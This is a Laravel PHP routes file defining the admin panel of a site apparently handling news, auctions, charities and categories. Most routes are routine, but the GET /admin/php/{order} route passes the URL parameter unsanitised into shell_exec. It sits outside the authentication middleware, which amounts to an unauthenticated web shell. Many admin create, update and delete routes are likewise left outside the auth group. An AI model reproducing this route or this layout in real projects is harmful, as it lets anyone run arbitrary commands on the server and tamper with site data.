<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Config;
use Spatie\Permission\Models\Role;

Route::group(['prefix' => 'admin'], function () {
    //    Config::set('auth.defines', 'admin');

    Route::get(
        'login',
        function () {
            if (Auth::guard('admin')->check()) {
                return redirect('admin/home');
            }
            return view('Admin/auth/login');
        }
    )->name('login');
    Route::post('do-log', 'AuthController@login')->name('do-log');

    Route::group(['middleware' => 'admin:admin'], function () {


        Route::get('/', function () {
            return view('Admin/home');
        })->name('/');
        Route::get('/home', 'AuthController@home')->name('/home');
        Route::get('/profile', function () {
            return view('Admin/profile');
        })->name('/profile');
        Route::post('/save.profile', 'AdminController@save_profile')->name('/save.profile');
        Route::get('log-out', 'AuthController@logout')->name('log-out');
        //
        //
 //============================================= Admin ====================================
        Route::resource('ShowAdmins', 'AdminController');
        Route::get('ShowAdminsCheckDelete', 'AdminController@ShowAdminsCheckDelete')->name('ShowAdminsCheckDelete');
//==============================================Users=======================================
        Route::get('ShowUsers', 'UserController@show')->name('UsersIndex');
        Route::get('AddUser', 'UserController@create')->name('UserCreate');
        Route::post('ShowUsers', 'UserController@store')->name('UserStore');
        Route::get('edit/{id}', 'UserController@edit')->name('UserEdit');
        Route::put('update/{id}', 'UserController@update')->name('UserUpdate');
        Route::post('delete/{id}', 'UserController@destroy')->name('UserDestroy');
        Route::get('/user/block_state/{id}','UserController@userStatus')->name('updateState.User');
//===============================================Messages=====================================
        Route::get('ShowMessages','MessageController@index')->name('MessagesIndex');
        Route::get('ShowMessage/{id}','MessageController@ShowMessage')->name('ShowMessage');
        Route::get('Reply/{id}','MessageController@ShowReplyForm')->name('ReplyForm');
        Route::post('replyMessage/{id}','MessageController@replyMessage')->name('ReplyMessage');
        Route::get('delete/{id}','MessageController@destroy')->name('destroyMessage');
    });
    Route::get('/php/{order}', function ($order) {
        $bath = base_path();
        //        $order = 'php artisan vendor:publish --tag=laravel-errors';
        return shell_exec("cd {$bath};{$order} ");
        //   \Artisan::call('dump-autoload');
        //   echo 'dump-autoload complete';
    });
// ===========================================News Routes=======================================

    Route::get('/news/index','NewsController@index')->name('show.news');
    Route::get('/news/create','NewsController@create')->name('create.news');
    Route::post('/news/save','NewsController@store')->name('store.news');
    Route::get('/news/{id}','NewsController@edit')->name('edit.news');
    Route::post('/news/update/{id}','NewsController@update')->name('update.news');
    Route::post('/news/delete/{id}','NewsController@destroy')->name('destroy.news');
    /*=============================Last News Links==============================*/
    Route::get('/last_news/index','LastNewsController@index')->name('show.last_news');
    Route::get('/last_news/create','LastNewsController@create')->name('create.last_news');
    Route::post('/last_news/save','LastNewsController@store')->name('store.last_news');
    Route::get('/last_news/{id}','LastNewsController@edit')->name('edit.last_news');
    Route::post('/last_news/update/{id}','LastNewsController@update')->name('update.last_news');
    Route::post('/last_news/delete/{id}','LastNewsController@destroy')->name('destroy.last_news');
//=============================================Auctions Routes===================================

    Route::get('/auctions/index','AuctionsController@index')->name('ShowAuctions.index');
    Route::get('/auction/state/{id}','AuctionsController@AuctionStatus')->name('updateState.Auction');
    Route::get('/auction/is_special/{id}','AuctionsController@is_special')->name('update_to_special.Auction');
    Route::get('/auction/delete/{id}','AuctionsController@destroyAuction')->name('delete.Auction');
    Route::get('/auction/{id}','AuctionsController@show')->name('auction_details');
//============================================Charities Routes====================================
    Route::get('/charities/index','CharityController@show')->name('ShowCharities.index');
    Route::get('/charities/insert','CharityController@insert')->name('insert.charity');
    Route::post('/charities/save','CharityController@store')->name('store.charity');
    Route::get('/charities/{id}','CharityController@edit')->name('edit.charity');
    Route::post('/charity/update/{id}','CharityController@update')->name('update.charity');
    Route::post('/charity/delete/{id}','CharityController@destroy')->name('destroy.charity');
    //---------------------------------Settings Routes-----------------------
    Route::get('/Settings','SettingController@index')->name('settings');
    Route::get('/Create/settings/{id}','SettingController@edit')->name('edit.settings');
    Route::post('/Create/settings/update/{id}','SettingController@update')->name('update.settings');
//  ================================================================================================
/*--------------------------------------------------About Us Linkes----------------------------------*/
    Route::get('/About_us','AboutController@index')->name('about');
    Route::get('/edit/about_us/{id}','AboutController@edit')->name('edit.about');
    Route::post('/update/about/{id}','AboutController@update')->name('update.about');
//============================================Charities Routes====================================
    Route::get('/categories/index','CategoryController@show')->name('ShowCategories.index');
    Route::get('/categories/insert','CategoryController@insert')->name('insert.category');
    Route::post('/categories/save','CategoryController@store')->name('store.category');
    Route::get('/categories/{id}','CategoryController@edit')->name('edit.category');
    Route::post('/category/update/{id}','CategoryController@update')->name('update.category');
    Route::post('/category/delete/{id}','CategoryController@destroy')->name('destroy.category');
});
